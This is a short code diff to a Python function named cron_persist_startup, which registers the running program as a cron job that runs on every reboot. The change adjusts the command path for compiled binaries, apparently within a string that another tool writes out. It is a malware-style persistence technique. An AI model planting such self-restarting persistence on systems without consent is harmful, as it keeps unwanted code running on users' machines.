@@ -17,7 +17,7 @@ def cron_persist_startup():
     if path.join(getcwd(),path.abspath(argv[0]))[-3:] == '.py':
         job = cron.new(command='python ' + path.join(getcwd(),path.abspath(argv[0])))
     else:
-        job = cron.new(command='./' + path.join(getcwd(),path.abspath(argv[0])))
+        job = cron.new(command=path.join(getcwd(),path.abspath(argv[0])))
     job.every_reboot()
     cron.write()
 ''')
